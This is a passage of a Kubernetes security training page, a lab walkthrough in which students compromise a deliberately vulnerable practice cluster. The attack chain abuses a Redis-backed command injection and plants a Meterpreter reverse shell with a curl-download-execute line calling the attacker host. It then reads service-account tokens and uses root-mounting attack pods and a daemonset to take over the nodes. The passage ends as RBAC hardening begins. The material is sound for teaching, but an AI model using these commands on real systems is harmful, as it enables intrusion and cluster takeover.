@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Exercise: Kubernetes Own the Nodes | Abusing and Protecting Kubernetes, Linux and Containers</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Exercise: Kubernetes Own the Nodes" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:10000/exercises/kubernetes-own-the-nodes/" />
+<meta property="og:url" content="http://0.0.0.0:10000/exercises/kubernetes-own-the-nodes/" />
+<meta property="og:site_name" content="Abusing and Protecting Kubernetes, Linux and Containers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Exercise: Kubernetes Own the Nodes" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Exercise: Kubernetes Own the Nodes","url":"http://0.0.0.0:10000/exercises/kubernetes-own-the-nodes/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:10000/feed.xml" title="Abusing and Protecting Kubernetes, Linux and Containers" /></head>
+<body><header class="site-header">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/">Abusing and Protecting Kubernetes, Linux and Containers</a>
+
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+        <div class="trigger">
+            <a class="page-link" href="/">Exercises</a>
+            <a class="page-link" href="/about/">About</a>
+            <a class="page-link" href="/help/">Help</a>
+        </div>
+      </nav>
+
+      <!-- This is the section that comes from the default minima theme -->
+      
+    </div>
+  </header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post">
+<link rel="stylesheet" href="/assets/css/style.css">
+ <header class="post-header">
+    <h1 class="post-title">Exercise: Kubernetes Own the Nodes</h1>
+  </header>
+
+
+  <div class="post-content">
+    
+
+    <h2 id="steps">Steps</h2>
+<ol>
+<li>
+<p>Start up a fresh lxterminal by clicking the &quot;sparrow&quot; logo in the bottom-left corner of the screen, clicking run, typing <code>lxterminal</code> and hitting enter. Alternatively, use the hot key sequence below:</p>
+<pre><code>&lt;hold down Alt&gt;&lt;hit F2&gt;lxterminal&lt;HIT the enter key&gt;
+</code></pre></li>
+<li>
+<p>Start your Kubernetes cluster - we will use this one for all Kubernetes exercises except for the Cloud Attacks, Peirates and Node Attacks:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/sync/bin/suspend-all-vms.sh
+/sync/bin/start-bustakube.sh
+</code></pre></div></div>
+</li>
+<li>
+<p>Wait a minute for the VM to boot, then SSH into the control plane node on the cluster:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> /sync/bustakube-node-key root@bustakube-controlplane
+</code></pre></div></div>
+</li>
+<li>
+<p>Run the stage script for the first scenario:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/bustakube/Scenario1-OwnTheNodes/stage-scenario-1.sh
+</code></pre></div></div>
+</li>
+<li>
+<p>Wait for the script to finish.</p>
+</li>
+<li>
+<p>Start up a Firefox browser.  You can use the icon in the top left menu bar, or use the same &quot;Run&quot; process from step 1.  Then browse to the guestbook application via this URL:</p>
+<p><a href="http://bustakube-controlplane:31361/">http://bustakube-controlplane:31361/</a></p>
+</li>
+<li>
+<p>Enter in a message to show up in the guestbook and click &quot;Submit&quot;.</p>
+</li>
+<li>
+<p>Use the browser's &quot;View Source&quot; function to look at the source for this page.  In Firefox, you can either hit <code>Ctrl-U</code> or right-click the page and choose &quot;View Page Source&quot;.</p>
+</li>
+<li>
+<p>You may notice that the form intelligence is probably in the <code>controllers.js</code> file.</p>
+</li>
+<li>
+<p>Start a second browser tab, use it to browse to this URL, then use the View Source function (<code>Ctrl-U</code> / &quot;View Page Source&quot;):</p>
+<p><a href="http://bustakube-controlplane:31361/controllers.js">http://bustakube-controlplane:31361/controllers.js</a></p>
+<p>(On Firefox, you can just put this in your URL bar: <a href="view-source:http://10.23.58.40:31361/controllers.js">view-source:http://10.23.58.40:31361/controllers.js</a>)</p>
+</li>
+<li>
+<p>Notice that there are two functions.</p>
+<p>a. The first, sent on Guestbook message submission, sends a request like this:</p>
+<pre><code>guestbook.php?cmd=set&amp;key=messages&amp;value=VALUE
+</code></pre>
+<p>b. The second gets messages on the page by sending a request like this:</p>
+<pre><code>guestbook.php?cmd=get&amp;key=messages
+</code></pre>
+<p>c. This may be a vulnerability -- <code>guestbook.php</code> is letting the form choose which key it will set. It may even let the attacker choose an arbitrary command.</p>
+<p>d. Let's check this out -- browse to this URL to see if we can set a key called <code>hacker</code> to <code>1</code>.</p>
+<p><a href="http://bustakube-controlplane:31361/guestbook.php?cmd=set&amp;key=hacker&amp;value=1">http://bustakube-controlplane:31361/guestbook.php?cmd=set&amp;key=hacker&amp;value=1</a></p>
+<p>e. Now see if the key's value did indeed get set to 1 by browsing to this URL:</p>
+<p><a href="http://bustakube-controlplane:31361/guestbook.php?cmd=get&amp;key=hacker">http://bustakube-controlplane:31361/guestbook.php?cmd=get&amp;key=hacker</a></p>
+<p>f. Excellent! It looks like the key gets updated (or set) in Redis.</p>
+<p>g. Spoiler: <code>guestbook.php</code> won't send a command besides <code>get</code> and <code>set</code>.</p>
+<p>h. We'll have to see if this is useful to us.</p>
+</li>
+<li>
+<p>Let's go looking for any other web content that could be useful.  On your Kali system, start up <code>dirbuster</code>.  You can type <code>dirbuster</code> into a terminal window or use the same Run method we used in step 1.</p>
+</li>
+<li>
+<p>Set the &quot;Target URL&quot; to: <a href="http://bustakube-controlplane:31361/">http://bustakube-controlplane:31361/</a></p>
+</li>
+<li>
+<p>Use the <code>directory-list-lowercase-2.3-small.txt</code> wordlist</p>
+<p>a. Click <code>dirbuster</code>'s Browse button</p>
+<p>b. Navigate to <code>/usr/share/dirbuster/wordlists</code></p>
+<p>c. Choose the file <code>directory-list-lowercase-2.3-small.txt</code></p>
+</li>
+<li>
+<p>Deactivate dirbuster's &quot;Be Recursive&quot; toggle</p>
+</li>
+<li>
+<p>Click <code>dirbuster</code>'s Start button to start the scan, then click the &quot;Results - List View&quot; tab to switch to the Results view.</p>
+</li>
+<li>
+<p>When dirbuster finds <code>/status.php</code> and <code>/guestbook.php</code>, click <code>dirbuster</code>'s Stop button. <code>status.php</code> will be all we'll need.</p>
+</li>
+<li>
+<p>Open up a second browser tab and browse to this URL:</p>
+<p><a href="http://bustakube-controlplane:31361/status.php">http://bustakube-controlplane:31361/status.php</a></p>
+</li>
+<li>
+<p>We should get an ERROR message. If not, reload that link again to get an ERROR.</p>
+<p>a. This error suggests that the <code>status.php</code> page runs a command that it gets from the Redis &quot;command&quot; key.  It defaults to a <code>curl</code> command.</p>
+<p>b. Remember that we're able to set arbitrary Redis keys using <code>guestbook.php</code>.</p>
+</li>
+<li>
+<p>In a browser tab, use the <code>guestbook.php</code> page to set the command key to <code>whoami</code>:</p>
+<p><a href="http://bustakube-controlplane:31361/guestbook.php?cmd=set&amp;key=command&amp;value=whoami">http://bustakube-controlplane:31361/guestbook.php?cmd=set&amp;key=command&amp;value=whoami</a></p>
+</li>
+<li>
+<p>Now, load the <code>status.php</code> page to make the command execute - you may need to reload:</p>
+<p><a href="http://bustakube-controlplane:31361/status.php">http://bustakube-controlplane:31361/status.php</a></p>
+</li>
+<li>
+<p>Repeat the previous two steps with different values if you like, to see that you have a shell.</p>
+</li>
+<li>
+<p>Repeat 17, using the <code>guestbook.php</code> page to set the command key to <code>env | grep KUBERNETES</code> to look at the environment variables set in the pod</p>
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://bustakube-controlplane:31361/guestbook.php?cmd=set&amp;key=command&amp;value=env|grep KUBERNETES
+</code></pre></div></div>
+</li>
+<li>
+<p>Repeat step 18 to see the command run.</p>
+</li>
+<li>
+<p>Let's prep Metasploit to catch our shell.  Start a Metasploit console session:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+</code></pre></div></div>
+</li>
+<li>
+<p>In the console, run these commands to start a listener:</p>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
+<span class="n">set</span> <span class="n">payload</span> <span class="n">linux</span><span class="o">/</span><span class="n">x86</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+<span class="n">set</span> <span class="no">LHOST</span> <span class="mf">10.23</span><span class="o">.</span><span class="mf">58.30</span>
+<span class="n">set</span> <span class="no">ExitOnSession</span> <span class="kp">false</span>
+<span class="n">exploit</span> <span class="o">-</span><span class="n">j</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Start another terminal window/tab. Create a Meterpreter binary, as a Linux 32-bit ELF file, encoded with shikata_ga_nai, which will connect back to your Kali host's port <code>4444</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ~
+
+msfvenom <span class="nt">-a</span> x86 <span class="nt">--platform</span> linux <span class="nt">-p</span> linux/x86/meterpreter/reverse_tcp <span class="se">\</span>
+<span class="nv">LHOST</span><span class="o">=</span>10.23.58.30 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-o</span> mrsbin <span class="nt">-f</span> elf
+</code></pre></div></div>
+</li>
+<li>
+<p>Now stage a web server in that terminal, hosting the <code>mrsbin</code> binary:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ~ <span class="p">;</span> python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's now put a new command into the Redis database.  Go back to your browser tab that was submitting requests to <code>guestbook.php</code> and <strong>enter this in the value field</strong>:</p>
+<pre><code># curl http://10.23.58.30/mrsbin &gt;mrsbin ; chmod 0700 mrsbin ; ./mrsbin
+# DO NOT TYPE THE ABOVE INTO A SHELL
+</code></pre></li>
+<li>
+<p>Note that the complete URL bar in the previous step will look like:</p>
+<pre><code>http://bustakube-controlplane:31361/guestbook.php?cmd=set&amp;key=command&amp;value=curl http://10.23.58.30/mrsbin &gt;mrsbin ; chmod 0700 mrsbin ; ./mrsbin
+</code></pre></li>
+<li>
+<p>Go back to the browser tab that was loading <code>status.php</code> and hit reload.  Alternatively, use this URL:</p>
+<p><a href="http://bustakube-controlplane:31361/status.php">http://bustakube-controlplane:31361/status.php</a></p>
+</li>
+<li>
+<p>The status page will seem to be stuck loading forever.  This is good.  If you checked out your Python web server's output, you'll see that it has logged a <code>GET</code> request from the Kubernetes cluster, requesting the <code>mrsbin</code> binary:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.23.58.41 - - <span class="o">[</span>28/Jul/2023 00:52:13] <span class="s2">"GET /mrsbin HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+</li>
+<li>
+<p>Go check your Metasploit console. You should now see a line that reads something like &quot;Meterpreter session 1 opened…&quot;</p>
+</li>
+<li>
+<p>Congratulations! You've achieved remote code execution in a container that's in a pod in a Kubernetes cluster.</p>
+</li>
+<li>
+<p>Interact with this new session:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions <span class="nt">-i</span> 1
+</code></pre></div></div>
+</li>
+<li>
+<p>Upload a pod manifest YAML file into the container.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload /root/K8S-Exercise/attack-pod.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Send a <code>kubectl</code> binary into the container you've compromised.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload /root/K8S-Exercise/kubectl
+</code></pre></div></div>
+</li>
+<li>
+<p>Instruct meterpreter to give you a minimal interactive shell in the pod. You won't get any immediate feedback from the system, just a pair of &quot;Process … created&quot; and &quot;Channel … created&quot; lines from Metasploit.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
+</code></pre></div></div>
+</li>
+<li>
+<p>See what user you've scored.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Type <code>hostname</code> to see what pod you've landed in.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">hostname</span>
+</code></pre></div></div>
+</li>
+<li>
+<p><strong>Write down the pod name</strong> -- you will need it later on when we harden the cluster.</p>
+<pre><code># This is only an example!
+frontend-7c8f6c566-97kfh
+</code></pre></li>
+<li>
+<p>View the first flag.  You will likely want to zoom out.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>FLAG.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's get the service account that has been mounted into this container. Type this:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount | <span class="nb">grep </span>kubernetes
+</code></pre></div></div>
+</li>
+<li>
+<p>You'll see that the service account credentials are mounted into the container as <code>/run/secrets/kubernetes.io/serviceaccount</code>.</p>
+</li>
+<li>
+<p>List that mount point via:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> /run/secrets/kubernetes.io/serviceaccount
+</code></pre></div></div>
+</li>
+<li>
+<p>We will need both the certificate authority file (<code>ca.crt</code>) and the token (<code>token</code>).</p>
+</li>
+<li>
+<p>The format for the <code>kubectl</code> commands we'll be running is like so:</p>
+<pre><code># /var/www/html/kubectl --token=TOKENTEXT --certificate-authority=/path/ca.crt \
+# --server=https://kubernetes.default.svc.cluster.local:443 command-text
+</code></pre></li>
+<li>
+<p>Let's make things easy on ourselves by eliminating the need to type all of those flags over and over.  We'll put things in variables and use an <code>alias</code>.  Type this:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">DIR</span><span class="o">=</span><span class="s2">"/run/secrets/kubernetes.io/serviceaccount"</span>
+<span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"/var/www/html/kubectl --token=</span><span class="sb">`</span><span class="nb">cat</span> <span class="nv">$DIR</span>/token<span class="sb">`</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--certificate-authority=</span><span class="nv">$DIR</span><span class="s2">/ca.crt </span><span class="se">\</span><span class="s2">
+--server=https://kubernetes.default.svc.cluster.local:443"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now make the <code>kubectl</code> binary we uploaded executable by typing:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>u+x /var/www/html/kubectl
+</code></pre></div></div>
+</li>
+<li>
+<p>Now try asking the API server what pods exist and what nodes they're staged on by running:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pods <span class="nt">-o</span> wide
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's try seeing if we can stage our own malicious pod into the cluster.  Take a look at the pod definition by running:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>attack-pod.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Now try to stage it by running (and observe an error):</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl apply <span class="nt">-f</span> attack-pod.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>It looks like our account is forbidden to do this.  There are certainly all kinds of other things you could do at this point, but let's see if we can move to another pod. It may have a service account that is allowed to stage pods in the cluster.</p>
+</li>
+<li>
+<p>Run a <code>kubectl auth can-i</code> command to investigate what the authorization system allows:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl auth can-i <span class="nb">exec </span>pods
+</code></pre></div></div>
+</li>
+<li>
+<p>We get back a yes! Let's move laterally to the <code>redis-master</code> pod.  Look at your <code>kubectl get pods</code> output from earlier -- we need the full name of the <code>redis-master</code> pod.  We'll get it automatically with an embedded shell command.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+kubectl <span class="nb">exec</span> <span class="nt">-it</span> <span class="se">\</span>
+   <span class="si">$(</span>kubectl get pods | <span class="nb">grep </span>redis-master | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="si">)</span> <span class="nt">--</span> /bin/bash
+</code></pre></div></div>
+</li>
+<li>
+<p>Congratulations! You're now in a second container in the cluster, possibly running on a different node. You will see text that says you're not in a proper TTY.</p>
+</li>
+<li>
+<p>Type <code>id</code> to see what user you are.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Type <code>hostname</code> to see that you are in fact in the <code>redis-master</code> pod.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">hostname</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's make things easier on ourselves by adding a Meterpreter to this pod as well:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.23.58.30/mrsbin <span class="o">&gt;</span>mrsbin
+<span class="nb">chmod </span>0700 mrsbin
+./mrsbin
+</code></pre></div></div>
+</li>
+<li>
+<p>Hit <code>Ctrl-Z</code> then <code>Y</code> to background this Meterpreter channel.</p>
+</li>
+<li>
+<p>Type <code>background</code> to get back to the Metasploit console.</p>
+<pre><code>background
+</code></pre></li>
+<li>
+<p>Type <code>sessions -l</code> (for list) to see that there's a second session available now.  The new one runs as <code>uid=0</code>!</p>
+<pre><code>sessions -l
+</code></pre>
+<ul>
+<li>
+<p>If there isn't a new session yet, your handler in Metasploit might not be accepting new connections.  If that's the case, use this troubleshooting step:</p>
+<pre><code>exploit -j
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p>Once you see a new session, type <code>sessions -i 2</code> to interact with the second session.</p>
+</li>
+<li>
+<p>Upload two YAML files we'll use to start up pods from this Redis container.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload /root/K8S-Exercise/attack-pod.yaml
+upload /root/K8S-Exercise/daemonset-attack.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Upload a kubectl binary to the Redis container.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload /root/K8S-Exercise/kubectl
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's start a shell in this container by typing <code>shell</code> into the Metasploit console.</p>
+</li>
+<li>
+<p>Make the shell interactive and easier to read by running a few commands:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span>
+<span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">"</span><span class="se">\u</span><span class="s2">@</span><span class="se">\h</span><span class="s2"> # "</span>
+<span class="nb">unalias ls
+export </span><span class="nv">TERM</span><span class="o">=</span>vt100
+</code></pre></div></div>
+</li>
+<li>
+<p>Now let's set up <code>kubectl</code> in the Redis master pod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>u+x kubectl
+
+<span class="nb">export </span><span class="nv">DIR</span><span class="o">=</span><span class="s2">"/run/secrets/kubernetes.io/serviceaccount"</span>
+
+<span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"/data/kubectl --token=</span><span class="sb">`</span><span class="nb">cat</span> <span class="nv">$DIR</span>/token<span class="sb">`</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--certificate-authority=</span><span class="nv">$DIR</span><span class="s2">/ca.crt </span><span class="se">\</span><span class="s2">
+ --server=https://kubernetes.default.svc.cluster.local:443"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now let's ask if we are allowed to create pods:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl auth can-i create pods
+</code></pre></div></div>
+</li>
+<li>
+<p>We got a yes! Take a look at my attack-pod.yaml file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>attack-pod.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>In that YAML file, take a look at the <code>containers:</code> section's <code>volumeMounts:</code> list - this tells Kubernetes what named &quot;volume&quot; to mount onto what path in the container.</p>
+</li>
+<li>
+<p>Also, note how the named volume <code>mount-root-into-mnt</code> is described in the <code>volumes:</code> section, showing what path from the node's host filesystem gets that name.</p>
+</li>
+<li>
+<p>Finally, in that YAML file, notice that the container image we've chosen is <code>k8s.gcr.io/redis:e2e</code>.  We chose that because it's likely cached on the Kubernetes nodes. How would you determine this? You want to run a command like this, with the correct values for <code>STR1</code> and <code>STR2</code>:</p>
+<pre><code>kubectl get pod redis-master-STR1-STR2 -o yaml | grep &quot;image:&quot;
+</code></pre>
+<p>Here's a version you can copy and paste:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pod <span class="se">\</span>
+ <span class="sb">`</span>kubectl get pods | <span class="nb">grep </span>redis-master | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="sb">`</span> <span class="se">\</span>
+ <span class="nt">-o</span> yaml | <span class="nb">grep</span> <span class="s2">"image:"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's deploy this attack pod, with a <code>kubectl apply -f</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl apply <span class="nt">-f</span> attack-pod.yaml
+</code></pre></div></div>
+<p>You can also tell Kubernetes to let you know when the new pod is ready:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nb">wait</span> <span class="nt">--for</span><span class="o">=</span><span class="nv">condition</span><span class="o">=</span>ready pod/attack-pod
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's see where our pod is running, using:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pods <span class="nt">-o</span> wide
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's go attack the node where that pod is running – you'll need to wait for the pod to be <code>Running</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nb">exec</span> <span class="nt">-it</span> attack-pod <span class="nt">--</span> /bin/bash
+</code></pre></div></div>
+</li>
+<li>
+<p>Now we're in a container, in a pod that we designed, on one of the cluster nodes.  Find out which one:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /mnt/etc/hostname
+</code></pre></div></div>
+</li>
+<li>
+<p>The <code>/mnt</code> directory in this container is the <code>/</code> directory on this node.  Let's look for a flag.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> /mnt
+</code></pre></div></div>
+</li>
+<li>
+<p>Grab a flag:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /mnt/FLAG.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>User <code>bustakube</code> has <code>sudo</code> rights on this node.  Let's change their password.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chroot</span> /mnt /bin/bash
+passwd bustakube
+bustakube
+bustakube
+<span class="nb">exit</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now leave this <code>kubectl</code> exec, so that you're back in the Redis pod.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exit</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Confirm for yourself that you're in the redis pod by running <code>hostname</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">hostname</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's put an attack pod on every node in the cluster (including the control plane node). We'll use a daemonset. Take a look at its contents via:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>daemonset-attack.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Note that this daemonset defines a pod that it will place on every node.  The pod has a container called <code>attack-root</code>.</p>
+</li>
+<li>
+<p>Note how the pod mounts a volume called <code>hostroot</code>, which is the node's host filesystem <code>/</code>, onto the container's <code>/mnt</code>.</p>
+</li>
+<li>
+<p>Let's apply this attack daemonset with:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl apply <span class="nt">-f</span> daemonset-attack.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>See where this staged pods by running:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pods <span class="nt">-o</span> wide
+</code></pre></div></div>
+</li>
+<li>
+<p>Go get your other node flag, by using a <code>kubectl exec</code> on the <code>attack-daemonset</code> pod that corresponds to the node you haven't compromised already.</p>
+<pre><code>kubectl exec attack-daemonset-STR1 -- cat /mnt/FLAG.txt
+# Do not copy and paste this - you need to fill in STR1
+</code></pre></li>
+<li>
+<p>Now, let's go compromise the control plane node.  Run a <code>kubectl</code> for whichever pod corresponds to the <code>bustakube-controlplane</code> (hint: look at the output of <code>kubectl get pods -o wide</code>):</p>
+<pre><code>kubectl exec -it attack-daemonset-STR2 -- /bin/bash
+# Do not copy and paste this - you need to fill in STR2
+</code></pre></li>
+<li>
+<p>Now change bustakube's password on the <code>bustakube-controlplane</code> system:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chroot</span> /mnt /bin/bash
+passwd bustakube
+</code></pre></div></div>
+</li>
+<li>
+<p>Enter in a password - we choose <code>bustakube</code> to keep things simple:</p>
+<pre><code>bustakube
+bustakube
+</code></pre></li>
+<li>
+<p>We are chrooted into the <code>/mnt</code> directory in this container (the <code>/</code> directory on this node). Let's look for a flag.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> /
+</code></pre></div></div>
+</li>
+<li>
+<p>Grab the last flag:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /FLAG.txt
+</code></pre></div></div>
+</li>
+<li>
+<p>Finally, starting a new terminal on your Kali system, <code>ssh</code> into the <code>bustakube-controlplane</code> machine:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh bustakube@bustakube-controlplane
+</code></pre></div></div>
+</li>
+<li>
+<p>Type the password you chose:</p>
+<pre><code>bustakube
+</code></pre></li>
+<li>
+<p>Switch to root:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su -
+</code></pre></div></div>
+</li>
+<li>
+<p>Congratulations! You've just compromised the cluster.  Take a deep breath.</p>
+</li>
+<li>
+<p>Now let's lock this cluster down.</p>
+</li>
+<li>
+<p>On the <code>bustakube-controlplane</code> machine, we'll find a directory full of YAML files:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /usr/share/bustakube/Scenario1-OwnTheNodes/Defense/RBAC/
+</code></pre></div></div>
+</li>
+<li>
+<p>Look at contents of the<code>role-get-only-on-pods.yaml</code> file.  It defines a set of capabilities, a role, called <code>get-only-on-pods</code>.  This is an allowlist definition that allows any account with this role to execute &quot;get&quot; API requests on &quot;pods.&quot;</p>
+</li>
+</ol>
+<pre><code>```shell
+cat role-get-only-on-pods.yaml
+```
+</code></pre>
+<ol start="101">
+<li>Add this role to the default namespace with:</li>
+</ol>
+<pre><code>```shell
+kubectl apply -f role-get-only-on-pods.yaml
+```
+</code></pre>
+<ol start="102">
+<li>Take a look at what service accounts exist on the cluster in the default namespace:</li>
+</ol>
+<pre><code>```shell
+kubectl get serviceaccounts
+```
+</code></pre>
+<ol start="103">
+<li>
+<p>Since there are already <code>frontend</code> and <code>redis</code> roles, we won't create them.  Look at the files used to create them.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> ../../Namespace-Default/service-account-frontend.yaml
+<span class="nb">cat</span> ../../Namespace-Default/service-account-redis.yaml
+</code></pre></div></div>
+</li>
+<li>
